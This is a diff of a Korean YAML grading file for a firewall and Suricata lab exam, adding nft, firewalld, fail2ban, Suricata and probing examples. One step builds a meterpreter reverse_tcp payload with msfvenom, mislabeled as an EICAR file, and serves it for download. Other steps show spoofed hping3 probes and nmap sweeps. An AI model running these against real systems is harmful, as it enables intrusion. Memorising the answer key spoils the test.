@@ -46,6 +46,74 @@ steps:
       - /etc/nftables.conf 에 table+chain 블록 후 nft -f 로드
       - Ansible ansible.posix.firewalld 모듈
       - sudo nft create table(idempotent 아님)
+      - |
+        **[OSS] nft (default-deny table 생성)** — 표준 명령.
+          # 1. table + policy drop chain 생성 (한 줄)
+          sudo nft add table inet exam && sudo nft add chain inet exam input '{ type filter hook input priority 0 \; policy drop \; }'
+          # 2. 적재 검증 (chain 의 policy + hook)
+          sudo nft list chain inet exam input
+          # 3. JSON 출력 (자동화 검증)
+          sudo nft -j list chain inet exam input | jq '.nftables[].chain | {name, type, hook, prio, policy}'
+        예상 출력 `chain input { type filter hook input priority filter; policy drop; }`.
+        운영 해석: priority filter (= 0) + policy drop = default-deny 표준. 후속 룰에서 명시 허용만 통과.
+      - |
+        **[OSS] firewalld (zone 기반 default-deny)** — RHEL 표준.
+          # 1. firewalld 의 drop zone (built-in)
+          sudo firewall-cmd --get-default-zone
+          sudo firewall-cmd --info-zone=drop
+          # 2. 새 zone 'exam' 생성 + target=DROP
+          sudo firewall-cmd --permanent --new-zone=exam
+          sudo firewall-cmd --permanent --zone=exam --set-target=DROP
+          sudo firewall-cmd --reload
+          # 3. 검증
+          sudo firewall-cmd --zone=exam --list-all
+        예상 출력 `target: DROP / interfaces: / sources: / services:`.
+        운영 해석: zone 의 target=DROP = nft policy drop 와 동등. interface/source 추가 시 zone 적용.
+      - |
+        **[OSS] ufw default deny** — Ubuntu 환경.
+          # 1. default policy
+          sudo ufw default deny incoming
+          sudo ufw default allow outgoing
+          # 2. lockout 방지: SSH 먼저 허용 (이후 step 에서 추가)
+          sudo ufw allow ssh
+          sudo ufw enable
+          # 3. backend nft 검증
+          sudo nft list table inet ufw
+          sudo ufw status verbose
+        예상 출력 `Default: deny (incoming), allow (outgoing) / [1] 22/tcp ALLOW IN Anywhere`.
+        운영 해석: ufw 가 backend nft 에 자동 변환. 학습 친화 frontend.
+      - |
+        **[OSS] Ansible (ansible.posix.firewalld)** — IaC 표준.
+          # playbook
+          - name: Create exam zone with default-deny
+            ansible.posix.firewalld:
+              zone: exam
+              target: DROP
+              state: enabled
+              permanent: yes
+              immediate: yes
+          # 실행
+          ansible-playbook -i inventory.yml exam-zone.yml --check
+          ansible-playbook -i inventory.yml exam-zone.yml --diff
+        예상 출력 `changed: [secu] / target=DROP applied`.
+        운영 해석: 다중 host 일관 default-deny 배포. dry-run + diff 로 변경 확인.
+      - |
+        **[OSS] etckeeper (config 변경 audit)** — git 기반.
+          # 1. 변경 전 commit
+          sudo etckeeper commit "before exam table"
+          # 2. nft.conf 에 table 정의 추가
+          sudo tee -a /etc/nftables.conf << 'EOF'
+          table inet exam {
+              chain input { type filter hook input priority 0; policy drop; }
+          }
+          EOF
+          sudo nft -f /etc/nftables.conf
+          # 3. 변경 후 commit
+          sudo etckeeper commit "Add exam table with default-deny (jira: SEC-1234)"
+          # 4. diff 확인
+          sudo etckeeper vcs diff HEAD~1 HEAD -- /etc/nftables.conf
+        예상 출력 `+table inet exam { ... policy drop ... }`.
+        운영 해석: 변경 audit + git history. compliance + rollback 표준.
       negative_signs:
       - policy accept(default-allow)
       - other family(ip 등) 사용
@@ -106,6 +174,65 @@ steps:
       - '한 줄에 2 expression 결합: ct state established,related accept 후 iifname lo accept'
       - iptables -I INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
       - nft 로 base chain 에 기본 rule 배치
+      - |
+        **[OSS] nft (stateful + lo 표준 룰)** — Linux firewall 첫 룰 세트.
+          # 1. 두 룰 순차 추가 (&& 로 둘 다 성공 보장)
+          sudo nft add rule inet exam input ct state established,related accept && \
+            sudo nft add rule inet exam input iifname lo accept
+          # 2. 적용 검증
+          sudo nft list chain inet exam input
+          # 3. counter 추가 (어느 룰이 hit 되는지)
+          sudo nft replace rule inet exam input handle 4 ct state established,related counter accept
+        예상 출력 `chain input { ... ct state established,related accept / iifname "lo" accept }`.
+        운영 해석: 모든 firewall 의 첫 2 룰. 누락 시 outbound 응답 모두 drop = 시스템 마비.
+      - |
+        **[OSS] conntrack-tools (state 동작 검증)** — stateful 의 ground truth.
+          # 1. 현재 conntrack table (live state)
+          sudo conntrack -L --any | head
+          # 2. ESTABLISHED 만 필터
+          sudo conntrack -L --state ESTABLISHED
+          # 3. 신규 connection 실시간 monitor
+          sudo conntrack -E -e new
+          # 4. 통계
+          sudo conntrack -S
+        예상 출력 `tcp 6 ESTABLISHED src=10.20.30.201 dst=10.20.30.1 sport=44321 dport=22 [ASSURED] / Found 25 entries`.
+        운영 해석: ct state established accept 룰의 *실효성* 측정. ESTABLISHED 가 0 이면 룰 무용.
+      - |
+        **[OSS] firewalld (zone 의 conntrack 자동)** — built-in.
+          # firewalld 는 default 로 ct state established,related 자동 처리
+          # 1. zone 정보 (built-in conntrack 확인)
+          sudo firewall-cmd --info-zone=public | grep -i conn
+          # 2. interface lo 처리
+          sudo firewall-cmd --info-zone=trusted
+          # firewalld 에서 lo 는 자동 trusted (별도 설정 X)
+          # 3. 운영 시 권장: lo 트래픽 = trusted zone
+          sudo firewall-cmd --permanent --zone=trusted --add-interface=lo
+        예상 출력 `target: ACCEPT / interfaces: lo / services: ...`.
+        운영 해석: firewalld 의 zone 모델 = nft 의 룰 자동 처리. 운영자 관리 부담 감소.
+      - |
+        **[OSS] ufw (loopback 자동)** — default.
+          # ufw 는 default 로 lo 자동 허용
+          # 1. ufw 상태
+          sudo ufw status verbose | grep -i loopback
+          # 2. /etc/ufw/before.rules 에 loopback 룰 자동 포함
+          grep -A3 "loopback" /etc/ufw/before.rules
+          # 3. 명시적 추가 (이미 있어도 idempotent)
+          sudo ufw allow in on lo
+          sudo ufw allow out on lo
+        예상 출력 `Anywhere on lo                  ALLOW IN`.
+        운영 해석: ufw 가 대부분 환경에서 lo 자동 허용. 명시적 추가는 audit 친화적.
+      - |
+        **[OSS] netstat / ss (loopback 트래픽 검증)** — IPC 의존성.
+          # 1. lo 의 listening 서비스 (IPC 의존)
+          sudo ss -tnlp | grep -E "127\.0\.0\.1|::1"
+          # 2. 활성 lo connection
+          sudo ss -tn | grep "127.0.0.1"
+          # 3. lo 트래픽 통계
+          ip -s link show lo
+          # 4. lo 차단 시 영향 받을 서비스 사전 식별
+          sudo lsof -i @127.0.0.1 -P -n | head
+        예상 출력 `LISTEN 0 128 127.0.0.1:5432 ... (postgres) / LISTEN 0 128 127.0.0.1:6379 (redis)`.
+        운영 해석: PostgreSQL/Redis 등 IPC 사용 서비스 식별. lo 차단 시 이런 서비스 통신 마비.
       negative_signs:
       - ct state 만 추가(loopback 누락)
       - NEW state 포함(과도한 허용)
@@ -151,6 +278,78 @@ steps:
       - fail2ban 와 조합
       - 'set @trusted_ips 활용: ip saddr @trusted_ips tcp dport 22 accept'
       - iptables -m hashlimit --hashlimit 5/minute
+      - |
+        **[OSS] nft (rate-limited SSH whitelist)** — multi-condition 룰.
+          # 1. 다중 조건 결합 (CIDR + port + state + rate)
+          sudo nft add rule inet exam input \
+              ip saddr 10.20.30.0/24 tcp dport 22 ct state new limit rate 5/minute accept
+          # 2. burst 추가 (rate limit 시 일시 폭증 허용)
+          sudo nft add rule inet exam input \
+              ip saddr 10.20.30.0/24 tcp dport 22 ct state new limit rate 5/minute burst 3 packets accept
+          # 3. counter + log 결합 (운영 감사)
+          sudo nft add rule inet exam input \
+              ip saddr 10.20.30.0/24 tcp dport 22 ct state new counter log prefix "SSH-RATE-OK " limit rate 5/minute accept
+        예상 출력 `ip saddr 10.20.30.0/24 tcp dport 22 ct state new counter packets X bytes Y log prefix "SSH-RATE-OK " limit rate 5/minute accept`.
+        운영 해석: AND 조건 결합. 5/min 초과 시 룰 미매칭 → policy drop. burst 3 = 5/min 평균 + 3 packets 즉시 허용.
+      - |
+        **[OSS] fail2ban (userspace SSH brute 차단)** — nft + 보완.
+          # 1. /etc/fail2ban/jail.local
+          sudo tee /etc/fail2ban/jail.d/sshd-nft.local << 'EOF'
+          [sshd]
+          enabled = true
+          banaction = nftables-allports
+          maxretry = 3
+          findtime = 60
+          bantime = 600
+          EOF
+          sudo systemctl restart fail2ban
+          # 2. 차단 IP 목록
+          sudo fail2ban-client status sshd
+          # 3. nft set 자동 동기화
+          sudo nft list set inet fail2ban f2b-sshd
+        예상 출력 `Currently banned: 2 / IP list: 1.2.3.4 5.6.7.8`.
+        운영 해석: nft rate limit (network layer) + fail2ban (application log layer) 이중 방어. 표준 패턴.
+      - |
+        **[OSS] crowdsec ssh-bf scenario** — community 차단.
+          # 1. SSH brute scenario 활성화
+          sudo cscli scenarios install crowdsecurity/ssh-bf crowdsecurity/ssh-slow-bf
+          sudo systemctl restart crowdsec
+          # 2. nft bouncer 와 자동 동기화
+          sudo apt install crowdsec-firewall-bouncer-nftables
+          sudo systemctl enable --now crowdsec-firewall-bouncer
+          # 3. 결정 목록 (community + 본인 환경)
+          sudo cscli decisions list --scenario crowdsecurity/ssh-bf
+          # 4. nft set 자동 적재
+          sudo nft list set inet crowdsec crowdsec-blacklists | wc -l
+        예상 출력 `crowdsecurity/ssh-bf trigger / 50 known-bad IPs in nft set`.
+        운영 해석: community-shared IOC 자동 반영. 단순 rate limit 외 *known-bad pre-block*.
+      - |
+        **[OSS] sshguard (가벼운 SSH 보호)** — fail2ban 대안.
+          # 1. 설치
+          sudo apt install sshguard
+          # 2. nft backend 설정
+          sudo tee -a /etc/sshguard/sshguard.conf << 'EOF'
+          BACKEND="/usr/libexec/sshg-fw-nft-sets"
+          THRESHOLD=30
+          BLOCK_TIME=120
+          DETECTION_TIME=1800
+          EOF
+          sudo systemctl restart sshguard
+          # 3. 차단 IP 목록
+          sudo nft list set inet sshguard attackers
+          sudo journalctl -u sshguard | grep "Blocking"
+        예상 출력 `Blocking 1.2.3.4:4 for >120secs`.
+        운영 해석: fail2ban 대비 메모리 1/10. SSH 만 보호 시 권장.
+      - |
+        **[OSS] auditd (SSH 시도 audit)** — accountability.
+          # 1. SSH 인증 시도 audit
+          sudo auditctl -w /var/log/auth.log -p wa -k ssh_attempts
+          # 2. 검색
+          sudo ausearch -k ssh_attempts --start today | head
+          # 3. SSH 실패 추출 + IP 별 통계
+          sudo journalctl -u ssh --since today | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn
+        예상 출력 `12 attempts from 10.20.30.201 / 5 attempts from 192.168.1.5`.
+        운영 해석: nft rate limit 가 차단해도 *SSH 인증 단계* 실패는 별도 audit. compliance 표준.
       negative_signs:
       - CIDR 생략(전체 허용)
       - rate 제한 없음
@@ -192,6 +391,67 @@ steps:
       - icmpv6 type echo-request accept (IPv6)
       - meta l4proto icmp accept (전체 ICMP)
       - icmp limit rate 10/second accept (throttle)
+      - |
+        **[OSS] nft (ICMP type 정밀 제어)** — protocol 지정.
+          # 1. echo-request (type 8) 만 허용
+          sudo nft add rule inet exam input icmp type echo-request accept
+          # 2. echo + reply 양방향 명시
+          sudo nft add rule inet exam input icmp type { echo-request, echo-reply } accept
+          # 3. rate limit (정찰 봇 방지)
+          sudo nft add rule inet exam input icmp type echo-request limit rate 10/second accept
+          # 4. IPv6 동등 (icmpv6)
+          sudo nft add rule inet exam input icmpv6 type echo-request accept
+        예상 출력 `chain input { ... icmp type echo-request accept }`.
+        운영 해석: type 정밀 지정 (8/0 만) = 다른 ICMP type (3 destination unreachable, 11 time exceeded) 차단. 보안 권장.
+      - |
+        **[OSS] hping3 (ICMP 다양 type 시뮬)** — 검증 표준.
+          # 1. echo-request (type 8) — 기본 ping
+          sudo hping3 -1 -c 3 10.20.30.1
+          # 2. timestamp request (type 13) — 차단되어야 정상
+          sudo hping3 --icmp-type 13 -c 3 10.20.30.1
+          # 3. address mask request (type 17) — 차단되어야 정상
+          sudo hping3 --icmp-type 17 -c 3 10.20.30.1
+          # 4. payload 큰 ICMP (MTU 시험)
+          sudo hping3 -1 -d 1400 -c 3 10.20.30.1
+        예상 결과 (echo-request): 응답 도달. (timestamp): 100% loss (drop).
+        운영 해석: type 별 차단 효과 정확 측정. 운영 시 echo-request 외 type 모두 차단 = 보안 표준.
+      - |
+        **[OSS] firewalld (ICMP block)** — zone 단위 차단.
+          # 1. firewalld 의 icmptype 목록
+          sudo firewall-cmd --get-icmptypes
+          # 2. echo-request 만 허용 (다른 차단)
+          sudo firewall-cmd --permanent --zone=public --add-icmp-block=destination-unreachable
+          sudo firewall-cmd --permanent --zone=public --add-icmp-block=timestamp-request
+          sudo firewall-cmd --reload
+          # 3. 검증
+          sudo firewall-cmd --zone=public --list-icmp-blocks
+        예상 출력 `destination-unreachable / timestamp-request`.
+        운영 해석: GUI 친화 ICMP 제어. timestamp/address-mask 등 정찰 type 차단 표준.
+      - |
+        **[OSS] tcpdump (ICMP wire-level 검증)** — 패킷 분석.
+          # 1. 모든 ICMP 캡처
+          sudo tcpdump -i ens33 -nn icmp -c 10
+          # 2. echo-request 만
+          sudo tcpdump -i ens33 -nn 'icmp[icmptype]=8' -c 5
+          # 3. echo-reply 만
+          sudo tcpdump -i ens33 -nn 'icmp[icmptype]=0' -c 5
+          # 4. 양방향 시각화
+          sudo tcpdump -i ens33 -nn 'icmp and (icmp[icmptype]=0 or icmp[icmptype]=8)'
+        예상 출력 `IP 10.20.30.201 > 10.20.30.1: ICMP echo request, id 12345 / IP 10.20.30.1 > 10.20.30.201: ICMP echo reply`.
+        운영 해석: 룰 적용 후 양방향 패킷 wire-level 확인. drop 룰일 때 reply 부재 = 정상 동작 evidence.
+      - |
+        **[OSS] sysctl (kernel ICMP 응답 제어)** — nft 외 layer.
+          # 1. 모든 ICMP echo 응답 차단 (nft 와 별개)
+          sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
+          # 2. broadcast ping 차단
+          sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
+          # 3. echo response rate limit
+          sudo sysctl -w net.ipv4.icmp_ratelimit=1000
+          sudo sysctl -w net.ipv4.icmp_ratemask=6168
+          # 4. 영속 (/etc/sysctl.conf)
+          echo "net.ipv4.icmp_echo_ignore_broadcasts=1" | sudo tee -a /etc/sysctl.conf
+        예상 출력 `net.ipv4.icmp_echo_ignore_all = 1` (차단).
+        운영 해석: nft 룰과 *별도* layer. icmp_echo_ignore_all=1 시 nft accept 룰도 무용. 두 layer 일관 설정 표준.
       negative_signs:
       - icmpv6 오타로 IPv4 ICMP 통과 안 함
       - type 지정 없이 모든 ICMP(너무 넓음)
@@ -236,6 +496,91 @@ steps:
       - Suricata file_data buffer 로 MIME 검사
       - YARA rule 로 binary 탐지
       - ClamAV + Suricata 통합
+      - |
+        **[OSS] echo + tee (룰 추가 + reload)** — 표준 워크플로우.
+          # 1. local.rules 에 룰 추가
+          echo 'alert http any any -> any any (msg:"Exam Rule - exe download"; content:".exe"; http_uri; sid:1000201; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules
+          # 2. syntax 검증 먼저
+          sudo suricata -T -S /etc/suricata/rules/local.rules
+          # 3. reload
+          sudo systemctl reload suricata
+          # 4. 적재 검증
+          sudo suricatasc -c "ruleset-stats" | jq '.message.loaded'
+        예상 출력 `Configuration provided was successfully loaded / 30001`.
+        운영 해석: tee -a 로 append + reload. validate 없이 reload 시 syntax error → service 영향. 검증 우선.
+      - |
+        **[OSS] sigma → Suricata 변환 (Sigma 표준)** — 표준 룰.
+          # 1. Sigma 룰 작성 (.exe download)
+          cat > /tmp/exe-download.yml << 'EOF'
+          title: Suspicious .exe Download
+          status: experimental
+          logsource:
+              category: webserver
+          detection:
+              selection:
+                  cs-uri-stem|endswith: '.exe'
+              condition: selection
+          level: medium
+          tags:
+              - attack.command_and_control
+              - attack.t1105
+          EOF
+          # 2. Suricata 룰로 변환
+          sigma convert -t suricata /tmp/exe-download.yml
+          # 3. 변환 결과 + sid 자동 할당
+          sigma convert -t suricata /tmp/exe-download.yml | sudo tee -a /etc/suricata/rules/local.rules
+        예상 출력 `alert http any any -> any any (msg:"Suspicious .exe Download"; http.uri; content:".exe"; endswith; sid:1; rev:1;)`.
+        운영 해석: Sigma 표준 = 다중 SIEM 호환. T1105 (Ingress Tool Transfer) ATT&CK 매핑 자동.
+      - |
+        **[OSS] Suricata file_data + hash 매칭 (정밀)** — 단순 .exe 보다 강력.
+          # 1. .exe 다운로드 시 fileinfo 자동 추출 + hash 계산
+          # /etc/suricata/suricata.yaml 의 file-store 활성화
+          # output:
+          #   - file-store:
+          #       enabled: yes
+          #       force-magic: yes
+          #       force-hash: [md5, sha256]
+          # 2. 룰: malware hash 매칭
+          echo 'alert http any any -> any any (msg:"Known malware hash"; filemagic:"PE32"; filemd5:/etc/suricata/malware-md5s.txt; sid:1000202; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules
+          # 3. malware-md5s.txt 에 알려진 해시 등록
+          # 4. reload
+          sudo systemctl reload suricata
+        예상 효과: 단순 .exe 외 *알려진 악성 파일 hash* 매칭. false positive ↓.
+        운영 해석: 단순 확장자 → 파일 magic + hash 매칭으로 정밀도 ↑. CTI feed 와 통합.
+      - |
+        **[OSS] YARA + Suricata** — binary signature 표준.
+          # 1. YARA rule 작성
+          cat > /tmp/exe.yar << 'EOF'
+          rule Suspicious_PE_Download {
+              meta:
+                  description = "Suspicious PE32 executable download"
+              strings:
+                  $a = "MZ"  // PE header magic
+                  $b = "This program cannot be run in DOS mode"
+              condition:
+                  $a at 0 and $b
+          }
+          EOF
+          # 2. Suricata + YARA 통합 (Suricata 7+)
+          # /etc/suricata/suricata.yaml 의 yara-files 활성화
+          # 3. 룰
+          echo 'alert http any any -> any any (msg:"YARA PE detected"; flow:established,to_client; file_data; yara:"/tmp/exe.yar"; sid:1000203; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules
+        예상 결과: PE32 binary 자동 식별 + alert.
+        운영 해석: 확장자 무관 binary 자동 식별. 우회 (확장자 변경) 방어.
+      - |
+        **[OSS] ClamAV + Suricata 통합** — 다단계 검사.
+          # 1. ClamAV 설치
+          sudo apt install clamav clamav-daemon
+          sudo systemctl start clamav-daemon
+          # 2. Suricata file-store 의 파일을 ClamAV scan
+          # cron + script:
+          # for f in /var/log/suricata/files/*; do
+          #     clamscan --no-summary "$f" | grep "FOUND" >> /var/log/suricata/clamav-found.log
+          # done
+          # 3. 결과 통합 (alert 자동 enrich)
+          tail -f /var/log/suricata/clamav-found.log
+        예상 출력 `/var/log/suricata/files/file.123: Win.Trojan.Generic FOUND`.
+        운영 해석: Suricata 단순 .exe 차단 + ClamAV 의 정확한 malware 식별 결합. 다층 방어.
       negative_signs:
       - http_uri 없이 raw match
       - sid 1000201 누락 또는 중복
@@ -278,6 +623,65 @@ steps:
       - sudo nft -a list table inet exam(handle 번호)
       - sudo nft -j list table inet exam | jq
       - sudo nft list chain inet exam input
+      - |
+        **[OSS] nft list (룰 검증 + handle)** — 표준.
+          # 1. 전체 table 출력
+          sudo nft list table inet exam
+          # 2. handle 번호 포함 (수정/삭제 시 참조)
+          sudo nft -a list table inet exam
+          # 3. JSON 출력 (자동화 검증)
+          sudo nft -j list table inet exam | jq
+          # 4. 룰 순서 + counter 통합
+          sudo nft list chain inet exam input
+        예상 출력 `chain input { type filter hook input priority filter; policy drop; / # handle 4 / ct state established,related accept ... }`.
+        운영 해석: 룰 순서 (top-to-bottom) + handle = 수정 표준. JSON 출력 = CI/CD 통합.
+      - |
+        **[OSS] firewalld --list-all (zone 의미적 view)** — RHEL 표준.
+          # 1. zone 전체 정보
+          sudo firewall-cmd --zone=exam --list-all
+          # 2. 영속 vs runtime 비교
+          diff <(sudo firewall-cmd --permanent --zone=exam --list-all) \
+               <(sudo firewall-cmd --zone=exam --list-all)
+          # 3. 모든 zone 한 번에
+          sudo firewall-cmd --list-all-zones | head -30
+        예상 출력 `exam (active) / target: DROP / interfaces: / services: ssh / ports: / rich rules: ...`.
+        운영 해석: zone 단위 의미적 view. nft 의 raw 출력보다 *목적* 명확.
+      - |
+        **[OSS] cockpit Networking (GUI 룰셋 view)** — web GUI.
+          # 1. Cockpit 접속 (https://10.20.30.1:9090)
+          # 2. 좌측 Networking → Firewall 메뉴
+          # 3. UI 동작:
+          # - 좌측: zone 목록 (exam zone 클릭)
+          # - 우측: services / ports / rich rules tab
+          # - drag & drop 으로 룰 순서 변경
+          # 4. CLI 검증
+          ssh ccc@10.20.30.1 "sudo nft list table inet exam"
+        UI 동작: 룰셋 시각화 + 편집. CLI 익숙치 않은 운영자 표준.
+        운영 해석: 다중 zone 환경에서 시각적 비교. 다중 분석가 환경 audit 친화.
+      - |
+        **[OSS] nft monitor (실시간 변경 watch)** — audit.
+          # 1. 별도 터미널에서 nft monitor 시작
+          sudo nft monitor &
+          # 2. 다른 곳에서 룰 변경
+          sudo nft add rule inet exam input tcp dport 8080 accept
+          # 3. monitor 출력에서 변경 evidence
+          # add rule inet exam input tcp dport 8080 accept
+          # 4. 특정 event 만 monitor
+          sudo nft monitor rules
+        UI 동작: 실시간 변경 stream.
+        운영 해석: 누가 언제 룰 변경했는지 실시간 audit. 의심 변경 즉시 인지.
+      - |
+        **[OSS] etckeeper diff (영속 변경 추적)** — git 기반.
+          # 1. 현재 영속 룰셋 dump
+          sudo nft list ruleset > /etc/nftables.conf.current
+          # 2. etckeeper 의 변경 history
+          sudo etckeeper vcs log --oneline /etc/nftables.conf | head
+          # 3. 변경 diff
+          sudo etckeeper vcs diff HEAD~1 HEAD -- /etc/nftables.conf
+          # 4. 특정 시점 복원
+          sudo etckeeper vcs checkout abc123 /etc/nftables.conf
+        예상 출력 `commit abc123 + table inet exam { ... } / commit def456 - removed table`.
+        운영 해석: 영속 설정 변경 audit. 다음 부팅 후에도 룰 유지 보장.
       negative_signs:
       - 룰 순서 확인 없이 단순 실행
       - list ruleset 로 overkill
@@ -315,6 +719,56 @@ steps:
       - hping3 -1 -c 2 <IP>
       - nping --icmp -c 2 <IP>
       - fping -c 2 <IP>
+      - |
+        **[OSS] ping (표준 ICMP 도달성)** — 1차 진단 표준.
+          # 1. 2 패킷 + 2 초 timeout
+          ping -c 2 -W 2 10.20.30.1
+          # 2. 짧은 간격 (jitter 측정)
+          ping -c 4 -i 0.5 10.20.30.1
+          # 3. 큰 패킷 (MTU 시험)
+          ping -c 3 -s 1400 10.20.30.1
+        예상 출력 `2 packets transmitted, 2 received, 0% packet loss, time 1001ms / rtt min/avg/max/mdev = 0.234/0.345/0.456/0.111 ms`.
+        운영 해석: 0% loss + RTT < 5ms = 양호. 100% loss = nft icmp 룰 누락 또는 routing 문제.
+      - |
+        **[OSS] hping3 (정밀 패킷 제어)** — 침투 도구.
+          # 1. ICMP echo (기본)
+          sudo hping3 -1 -c 3 10.20.30.1
+          # 2. spoof source (룰 매칭 검증)
+          sudo hping3 -1 -a 192.168.99.99 -c 3 10.20.30.1
+          # 3. 다양 ICMP type (echo 외 차단 확인)
+          sudo hping3 --icmp-type 13 -c 3 10.20.30.1
+        예상 출력 (echo): 응답 정상. (spoof): 응답 X (return path 없음).
+        운영 해석: ping 보다 정밀. spoof 로 룰의 source 매칭 검증 = 정찰 시뮬.
+      - |
+        **[OSS] mtr (ping + traceroute)** — 경로 진단.
+          # 1. report mode
+          mtr -r -c 5 -n 10.20.30.1
+          # 2. JSON output (자동화)
+          mtr -j -c 3 -n 10.20.30.1 | jq
+          # 3. continuous (실시간)
+          mtr 10.20.30.1
+        예상 출력 `1.|-- 10.20.30.1   0.0%   5  0.5  0.5  0.4  0.7  0.1`.
+        운영 해석: 도달성 + 경로 + 성능 통합. 1 hop 직접 = 같은 segment. 2+ hop = router 경유.
+      - |
+        **[OSS] nmap host discovery** — 다중 host 동시.
+          # 1. ping sweep (전체 lab 인프라)
+          nmap -sn -PE 10.20.30.0/24
+          # 2. 단일 host + service detection
+          nmap -PE -p 22,80,443 10.20.30.1
+          # 3. UDP + TCP + ICMP 다중 probe
+          nmap -PE -PP -PS22,80,443 -PA80 10.20.30.1
+        예상 출력 `Host 10.20.30.1 is up (0.00045s latency) / 22/tcp open ssh / 80/tcp open http`.
+        운영 해석: ICMP 외 TCP/UDP 도달성 통합. 일부 환경 ICMP 차단해도 SSH 가능 검증.
+      - |
+        **[OSS] paping (TCP-only ping)** — ICMP 차단 환경.
+          # 1. SSH 도달성 (ICMP 무관)
+          paping 10.20.30.1 -p 22 -c 3
+          # 2. RTT 통계
+          paping 10.20.30.1 -p 22 -c 100 -i 100
+          # 3. 다른 포트
+          paping 10.20.30.1 -p 80 -c 3
+        예상 출력 `Connected to 10.20.30.1:22, time=0.5ms / Average: 0.5ms / Loss: 0%`.
+        운영 해석: ICMP 차단 환경의 도달성 검증. SSH 운영 실효성 측정.
       negative_signs:
       - 100% loss 정상 판정
       - -c 없이 무한 ping
@@ -355,6 +809,75 @@ steps:
       - curl -A Windows http://<IP>/malware.exe(User-Agent 다양)
       - Python requests.get(http://<IP>/malware.exe)
       - Metasploit msfvenom 로 실제 페이로드
+      - |
+        **[OSS] curl (HTTP malware 시뮬)** — 표준 도구.
+          # 1. 단순 GET .exe
+          curl -sS -o /dev/null -w "%{http_code}\n" http://10.20.30.80/malware.exe
+          # 2. User-Agent 변형 (악성 봇 시뮬)
+          curl -sS -A "Mozilla/5.0 (Windows)" http://10.20.30.80/malware.exe
+          # 3. POST body 로 .exe (URI 아님 = 룰 매칭 X)
+          curl -sS -X POST -d "file=malware.exe" http://10.20.30.80/upload
+          # 4. 다른 path 변형 (URL encoding 우회 시도)
+          curl -sS http://10.20.30.80/path%2Fmalware%2Eexe
+        예상 출력 `404` (파일 없음) — 응답 코드 무관, Suricata 가 request 본 순간 alert.
+        운영 해석: 응답 코드 X, *Suricata alert 발생 여부* 가 핵심. POST body 는 http_uri 매칭 X = 미발화.
+      - |
+        **[OSS] wget (file download 시뮬)** — alternative.
+          # 1. 단순 wget
+          wget -O /dev/null http://10.20.30.80/malware.exe
+          # 2. background download
+          wget -b -O /dev/null http://10.20.30.80/malware.exe
+          # 3. recursive (여러 .exe 동시)
+          wget -r -A '*.exe' http://10.20.30.80/files/
+          # 4. authentication
+          wget --user=admin --password=pass http://10.20.30.80/private/malware.exe
+        예상 출력 `404 Not Found / 0 written`.
+        운영 해석: curl 대안. recursive 옵션 = 다중 .exe 한 번에. 운영 시 wget 제한도 고려.
+      - |
+        **[OSS] Python requests (자동화 시뮬)** — script 친화.
+          # 1. 단일 요청
+          python3 -c '
+          import requests
+          for fname in ["malware.exe", "trojan.exe", "evil.exe"]:
+              r = requests.get(f"http://10.20.30.80/{fname}")
+              print(f"{fname}: {r.status_code}")
+          '
+          # 2. 다양 User-Agent + 헤더
+          python3 -c '
+          import requests
+          headers = {"User-Agent": "Wget/1.20.3 (linux-gnu)"}
+          r = requests.get("http://10.20.30.80/malware.exe", headers=headers)
+          print(r.status_code)'
+        예상 출력 `malware.exe: 404 / trojan.exe: 404 / evil.exe: 404`.
+        운영 해석: 다중 파일 + UA 변형 자동화. 룰의 *완전성* 측정.
+      - |
+        **[OSS] metasploit (msfvenom + delivery)** — 실제 페이로드.
+          # 1. msfvenom 으로 실제 EICAR test 파일 생성
+          msfvenom -p windows/meterpreter/reverse_tcp \
+              LHOST=10.20.30.201 LPORT=4444 \
+              -f exe -o /tmp/payload.exe
+          # 2. simple HTTP server 로 delivery
+          cd /tmp && python3 -m http.server 8888 &
+          # 3. attacker 시뮬 (legitimate test only!)
+          curl -sS http://10.20.30.201:8888/payload.exe -o /tmp/downloaded.exe
+          # 4. 다중 endpoint 다운로드 시뮬
+          for ext in exe dll bat ps1; do
+              curl -sS "http://10.20.30.80/payload.$ext" -o /dev/null -w "%{http_code} payload.$ext\n"
+          done
+        예상 출력 `payload.exe / 200 / Suricata alert sid:1000201 fired`.
+        운영 해석: lab 환경의 *실제* malware delivery 시뮬. 운영 시 학습 environment 만 사용.
+      - |
+        **[OSS] httpie (HTTP 친화 CLI)** — curl 대안.
+          # 1. GET .exe + 헤더 출력
+          http -p hH GET http://10.20.30.80/malware.exe
+          # 2. session 유지 (인증 후 download 시뮬)
+          http --session=test GET http://10.20.30.80/malware.exe
+          # 3. download to file
+          http --download GET http://10.20.30.80/malware.exe
+          # 4. follow redirect
+          http --follow GET http://10.20.30.80/redirect-to-malware
+        예상 출력 `GET /malware.exe HTTP/1.1 / Host: 10.20.30.80 / HTTP/1.1 404 Not Found`.
+        운영 해석: 가독성 ↑. 학습 시 표준. 운영 자동화는 curl/python.
       negative_signs:
       - 다른 확장자(txt/php) 요청
       - POST body 에 .exe 포함(URI 아님)
@@ -399,6 +922,69 @@ steps:
       - sudo grep -F 1000201 /var/log/suricata/fast.log
       - Kibana filter signature_id == 1000201 + count
       - suricatasc -c dump-counters 에서 alert 수
+      - |
+        **[OSS] grep -c (단순 카운트)** — 빠른 검증.
+          # 1. signature_id:1000201 매칭 카운트
+          sudo grep -c '"signature_id":1000201' /var/log/suricata/eve.json
+          # 2. fallback (regex)
+          sudo grep -cE '"signature_id"\s*:\s*1000201' /var/log/suricata/eve.json
+          # 3. fast.log 동시 검증
+          sudo grep -c '\[1:1000201:' /var/log/suricata/fast.log
+          # 4. 0 count 시 alert 부재 = 룰 미동작 또는 트래픽 미도달
+          [ $(sudo grep -c '"signature_id":1000201' /var/log/suricata/eve.json) -gt 0 ] && echo "OK"
+        예상 출력 `12 / 12 / 12` (eve.json + fast.log 일치).
+        운영 해석: 0 count 시 trouble shoot. 룰 적재 → 트래픽 도달 → 매칭 단계별 점검.
+      - |
+        **[OSS] jq (정밀 alert 분석)** — JSON query 표준.
+          # 1. sid:1000201 alert 만 추출
+          sudo jq -c 'select(.event_type=="alert" and .alert.signature_id==1000201)' /var/log/suricata/eve.json | tail -3
+          # 2. 핵심 필드만 추출 (table 형식)
